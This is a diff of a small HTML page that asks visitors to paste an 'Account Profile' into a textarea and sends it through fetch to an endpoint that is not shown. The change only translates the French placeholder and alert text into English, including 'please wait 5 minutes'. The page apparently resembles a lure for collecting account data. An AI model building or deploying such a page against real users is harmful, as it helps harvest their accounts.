@@ -30,7 +30,7 @@
 <body>
 
     <h2>Paste Account Profile Here</h2>
-    <textarea id="message" placeholder="Écris ton message ici..."></textarea><br>
+    <textarea id="message" placeholder="Please put the Profile here..."></textarea><br>
     <button onclick="sendMessage()">Envoyer</button>
 
     <script>
@@ -50,14 +50,14 @@
             })
             .then(response => {
                 if (response.ok) {
-                    alert("Message envoyé !");
+                    alert("Message sent please wait 5 minutes!");
                     document.getElementById("message").value = ""; // Efface le champ texte
                 } else {
-                    alert("Erreur lors de l'envoi !");
+                    alert("umm we got a problem...");
                 }
             })
             .catch(error => {
-                alert("Une erreur est survenue !");
+                alert("umm we got a problem...");
                 console.error(error);
             });
         }
